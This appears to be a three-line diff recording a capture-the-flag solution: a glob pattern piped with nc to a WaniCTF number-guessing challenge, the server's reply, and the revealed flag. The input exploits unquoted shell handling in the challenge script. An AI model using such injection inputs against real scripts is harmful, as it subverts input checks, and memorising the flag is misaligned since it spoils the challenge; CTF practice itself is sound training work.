@@ -1,0 +1,3 @@
+$ echo '[0-9%]*' | nc chal-lz56g6.wanictf.org 7580
+Can you guess the number? > [0-9
+How did you know?!FLAG{use_she11check_0r_7he_unexpec7ed_h4ppens}
